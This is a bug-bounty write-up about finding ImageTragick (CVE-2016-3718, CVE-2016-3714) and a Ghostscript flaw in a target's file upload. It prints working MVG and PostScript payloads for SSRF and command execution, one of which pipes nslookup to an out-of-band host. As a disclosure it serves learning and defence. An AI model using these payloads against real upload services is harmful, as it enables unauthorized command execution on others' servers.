---
title: Insecure File Upload Leads to SSRF and RCE
author: Muhammad Adel
date: 2021-011-10 19:40:00 +0200
categories: [Bug Hunting]
tags: [bug hunting, web, writeups]
---
## **Introduction**
Peace be upon you all, I am going to share with you a vulnerability which I have found almost a year ago and it is really remarkable for me because it was the first critical one for me any way let's jump in.

## **ImageMagick**
It is a package commonly used by web services to process images. A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP's imagick, Ruby's rmagick and paperclip, and nodejs's imagemagick.. it has been commonly exploited in 2016 when Nikolay Ermishkin from the Mail.Ru Security Team discovered several vulnerabilities in it under the CVEs **(CVE-2016-3714 - CVE-2016-3718 - CVE-2016-3715 - CVE-2016-3716 - CVE-2016-3717).** you can know more information about the vulnerability form here:  
[https://imagetragick.com/](https://imagetragick.com/)
## **The Finding**
I was testing the target for a couple of days and I was able to find multiple trivial XSS that's gave me an indication that this target didn't tested well before. Also, the target was running with PHP and I love it as Bug Hunter :). I looked for the file upload vulnerability and I started by sending it to burp plugin which test the file upload vulnerability. after some minutes I saw that red message that the target is vulnerable to CVE-2016-3714. great it is time for validating.

### **SSRF via CVE-2016-3718**
I will setup burp collaborator to receive the connection then simply add the following payload and replace with my your web server URL:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
```

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MCqUkL4kqM1UUu5XPc6%2Fuploads%2FRRICM91g9OJ6HA9gLHTI%2FImagetragick%20CVE-2016-3718_redacted.png?alt=media&token=67ecf899-b8c0-4627-9fa8-745bf4d20843)

### **RCE via CVE-2016-3714**

Now, we have confirmed that it is using the image magic library and it is vulnerable to SSRF so let's try to get RCE.
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```

I tried it but it didn't give back anything. maybe it is blind?

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MCqUkL4kqM1UUu5XPc6%2Fuploads%2Ferrm4RKgIvm3SHHVxJ2Q%2FImagetragick%20CVE-2016-3718%20Payload.png?alt=media&token=aab34ad1-4c87-4bfe-8bc3-45c130d1893b)

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MCqUkL4kqM1UUu5XPc6%2Fuploads%2F0E7YUTHCDpWGo4963XkO%2FCollaborator%20CVE-2016-3718.png?alt=media&token=40aea20d-3428-4a61-86b6-98571a34ffae)

Great it is working perfectly!!

### **RCE via GhostScript**
After digging deeper I found that it is also vulnerable to ghostscript vulnerability which also will allow us to get RCE. let's see the following payload:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%nslookup <url>) currentdevice putdeviceprops
```
![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MR5KvOL_gXbwMWP6Z6m%2Fuploads%2FhyxVQVe6vG7InHA9B1H7%2FGhostscript%20RCE%20via%20File%20Upload%20redacted.png?alt=media&token=7ec3f68f-dc3d-452d-9c3a-10dc53dd9c36)

## **Conclusion**
I hope you enjoyed reading this and if you have any question feel free to ping me any time, Happy Hunting!
